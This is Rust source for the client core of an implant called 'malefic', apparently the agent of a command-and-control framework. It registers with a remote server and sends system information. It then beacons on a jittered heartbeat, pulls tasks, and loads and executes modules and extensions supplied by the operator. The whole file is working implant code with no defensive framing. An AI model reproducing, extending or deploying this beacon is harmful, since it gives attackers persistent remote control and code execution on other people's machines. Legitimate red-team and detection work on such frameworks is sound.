use std::fmt;
use std::time::Duration;
use anyhow::anyhow;
use async_std::task::sleep;
use prost::Message;
use malefic_helper::common::get_sysinfo;
use malefic_helper::common::transport::{Client, ClientTrait};
use malefic_helper::debug;
use malefic_helper::protobuf::implantpb;
use malefic_helper::protobuf::implantpb::spite::Body;
use malefic_helper::protobuf::implantpb::{Spite, Spites, Status};
use crate::common::common::{new_error_spite, new_spite};
use crate::{config, meta};
use crate::common::error::MaleficError;
use crate::malefic::malefic::MaleficChannel;
use crate::malefic::manager::MaleficManager;
use crate::meta::Meta;
use crate::scheduler::TaskOperator;


enum InternalModule {
    RefreshModule,
    ListModule,
    LoadModule,
    LoadExtension,
    ListExtension,
    ExecuteExtension,
    Clear,
    CancelTask,
    QueryTask,
    Unknown,
}

impl InternalModule {
    fn as_str(&self) -> &str {
        match self {
            InternalModule::RefreshModule => "refresh_module",
            InternalModule::ListModule => "list_module",
            InternalModule::LoadModule => "load_module",
            InternalModule::LoadExtension => "load_extension",
            InternalModule::ListExtension => "list_extension",
            InternalModule::ExecuteExtension => "execute_extension",
            InternalModule::Clear => "clear",
            InternalModule::CancelTask => "cancel_task",
            InternalModule::QueryTask => "query_task",
            InternalModule::Unknown => "unknown",
        }
    }

    pub fn all() -> Vec<String> {
        vec![
            InternalModule::RefreshModule,
            InternalModule::ListModule,
            InternalModule::LoadModule,
            InternalModule::LoadExtension,
            InternalModule::ListExtension,
            InternalModule::ExecuteExtension,
            InternalModule::Clear,
            InternalModule::CancelTask,
            InternalModule::QueryTask,
        ]
            .iter()
            .map(|m| m.as_str().to_string())
            .collect()
    }
}

impl fmt::Display for InternalModule {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        write!(f, "{}", self.as_str())
    }
}

impl From<&str> for InternalModule {
    fn from(module: &str) -> Self {
        match module {
            "refresh_module" => InternalModule::RefreshModule,
            "list_module" => InternalModule::ListModule,
            "load_module" => InternalModule::LoadModule,
            "load_extension" => InternalModule::LoadExtension,
            "list_extension" => InternalModule::ListExtension,
            "execute_extension" => InternalModule::ExecuteExtension,
            "clear" => InternalModule::Clear,
            "cancel_task" => InternalModule::CancelTask,
            "query_task" => InternalModule::QueryTask,
            _ => InternalModule::Unknown,
        }
    }
}
pub struct MaleficParser {}

pub struct MaleficClient {
    // collector: Collector,
    client: Client,
    meta: Meta,
    channel: MaleficChannel,
    manager: MaleficManager,
}

impl MaleficClient {
    pub fn new(instance_id: [u8;4], channel: MaleficChannel) -> Self {
        let mut manager = MaleficManager::new();
        if let Ok(_) = manager.refresh() {
            let mut malefic_client = MaleficClient {
                client: Client::new(config::URLS.clone()).unwrap(),
                meta: Meta::default(instance_id),
                channel,
                manager,
            };
            #[cfg(feature = "protocol_tls")]
            malefic_client.client.set_ca(config::CA.to_vec());
            malefic_client
        }else{
            panic!("origin modules refresh failed");
        }
    }

    pub(crate) async fn register(&mut self) -> bool {
        let sysinfo = if cfg!(feature = "register_info") {
            Some(get_sysinfo())
        } else {
            None
        };
        let spites = Spites { spites: vec![new_spite(0, "register".to_string(), Body::Register(
            implantpb::Register {
                name: config::NAME.to_string(),
                proxy: config::PROXY.to_string(),
                module: self.manager.list_module(InternalModule::all()),
                extension: Some(implantpb::Extensions{extensions: self.manager.list_extension()}),
                sysinfo,
                timer: Some(implantpb::Timer {
                    interval: config::INTERVAL.clone(),
                    jitter: config::JITTER.clone(),
                    heartbeat: config::INTERVAL.clone() + config::JITTER.clone(),
                    last_checkin: 0,
                }),
            }
        ))] };
        debug!("{:#?}", spites);
        let mut buf: Vec<u8> = Vec::new();
        if spites.encode(&mut buf).is_err() {
            debug!("register encode failed");
            return false;
        }
        debug!("buf len is {}", buf.len());

        let mut spite = meta::Spite::new(
            self.meta.get_uuid(),
            &buf);

        let ret = self.client.send(spite.pack()).await;

        return ret > 0;
    }

    pub async fn run(&mut self) -> Result<(), ()> {
        let empty_spite = implantpb::Spite {
            task_id: 0,
            r#async: true,
            timeout: 0,
            name: String::new(),
            error: 0,
            status: Some(Status::default()),
            body: None,
        };
        let empty_spites = Spites {
            spites: vec![empty_spite]
        };
        loop {
            sleep(Duration::from_millis(self.meta.new_heartbeat())).await;
            let _ = self.channel.request_sender.send(true).await;

            let serialized_data: Vec<u8>;
            if let Ok(data) = self.channel.response_receiver.recv().await{
                serialized_data = self.convert_spites_to_meta(data);
            }else{
                serialized_data = self.convert_spites_to_meta(empty_spites.clone());
            }

            let recv_data = self.client.send_with_read(serialized_data).await;
            if recv_data.is_empty() {
                continue;
            }

            if let Ok(spites) = MaleficParser::parser_tasks(recv_data) {
                debug!("{} spites ", spites.len());
                for spite in spites {
                    if cfg!(debug_assertions) {
                        if spite.encoded_len() <= 2048 {
                            println!("{:#?}", spite)
                        }else{
                            println!("taskid: {} {}", spite.task_id, spite.name)
                        }
                    }
                    match self.handler(spite.clone()).await {
                        Ok(_) => debug!("{}:{} sender succ", spite.task_id, spite.name),
                        Err(e) => {
                            debug!("handler encountered an error: {:#?}", e);
                            let error_id = if let Some(malefic_error) = e.downcast_ref::<MaleficError>() {
                                malefic_error.id()
                            } else {
                                999 // 例如，使用0作为未知错误的ID
                            };
                            let _ = self.channel.data_sender.send(new_error_spite(spite.task_id, spite.name, error_id)).await;
                            continue;
                        },
                    }
                }
            }
        }
    }

    fn convert_spites_to_meta(&self, bodys: Spites) -> Vec<u8> {
        let mut buf: Vec<u8> = Vec::new();
        if bodys.encode(&mut buf).is_err() {
            debug!("convert_spites_to_meta encode failed");
            return Vec::new();
        }

        let mut meta_data = meta::Spite::new(
            self.meta.get_uuid(),
            &buf);
        meta_data.pack()
    }

    async fn handler(&mut self, spite: Spite) -> anyhow::Result<()> {
        match InternalModule::from(spite.name.as_str()) {
            InternalModule::RefreshModule => {
                self.manager.refresh()?;
                self.channel.data_sender.send(new_spite(0, InternalModule::RefreshModule.to_string(), Body::Empty(implantpb::Empty::default()))).await?;
            },
            InternalModule::ListModule => {
                let result = new_spite(
                    spite.task_id,
                    InternalModule::ListModule.to_string(),
                    Body::Modules(implantpb::Modules{modules: self.manager.list_module(InternalModule::all())})
                    );
                self.channel.data_sender.send(result).await?;
            },
            InternalModule::LoadModule => {
                self.manager.load_module(spite.clone())?;
                self.channel.data_sender.send(new_spite(spite.task_id, InternalModule::LoadModule.to_string(), Body::Empty(implantpb::Empty::default()))).await?;
            },
            InternalModule::LoadExtension => {
                self.manager.load_extension(spite.clone())?;
                self.channel.data_sender.send(new_spite(spite.task_id, InternalModule::LoadExtension.to_string(), Body::Empty(implantpb::Empty::default()))).await?;
            },
            InternalModule::ListExtension => {
                let result = new_spite(
                    spite.task_id,
                    InternalModule::ListExtension.to_string(),
                    Body::Extensions(implantpb::Extensions{extensions: self.manager.list_extension()})
                );
                self.channel.data_sender.send(result).await?;
            },
            InternalModule::ExecuteExtension => {
                let result = self.manager.execute_extension(spite)?;
                let module = self.manager.get_module(&result.name).ok_or_else(|| anyhow!(MaleficError::ModuleNotFound))?;
                let body = result.body.ok_or_else(|| anyhow!(MaleficError::MissBody))?;
                self.channel.scheduler_task_sender.send((result.r#async, result.task_id, module.new_instance(), body)).await?;
            }
            InternalModule::Clear => {
                self.manager.clean();
                self.channel.data_sender.send(new_spite(spite.task_id, InternalModule::Clear.to_string(), Body::Empty(implantpb::Empty::default()))).await?;
            },
            InternalModule::CancelTask => {
                self.channel.scheduler_task_ctrl.send(TaskOperator::CancelTask(spite.task_id)).await?;
            },
            InternalModule::QueryTask => {
                self.channel.scheduler_task_ctrl.send(TaskOperator::QueryTask(spite.task_id)).await?;
            },
            _ => {
                let module = self.manager.get_module(&spite.name).ok_or_else(|| anyhow!(MaleficError::ModuleNotFound))?;
                let body = spite.body.ok_or_else(|| anyhow!(MaleficError::MissBody))?;
                self.channel.scheduler_task_sender.send((spite.r#async, spite.task_id, module.new_instance(), body)).await?;
            }
        };
        Ok(())
    }
}

impl MaleficParser {
    fn parser_spites(data: &Vec<u8>) ->  Vec<implantpb::Spite> {
        match Spites::decode(&data[..]) {
            Ok(spites) => {
                spites.spites
            },
            Err(err) => {
                debug!("parser_promises error, {:?}", err);
                return Vec::new();
            }
        }
    }

    pub fn parser_tasks(data: Vec<u8>) -> Result<Vec<implantpb::Spite>, MaleficError> {
        let mut spite = meta::Spite::default();
        spite.unpack(data).map_err(|e| {
            debug!("parser_tasks unpack failed: {:?}", e);
            MaleficError::UnpackError
        })?;

        // 检查spite数据是否为空
        if spite.get_data().is_empty() {
            debug!("parser_tasks data is empty");
            return Err(MaleficError::MissBody);
        }

        Ok(Self::parser_spites(spite.get_data()))
    }
}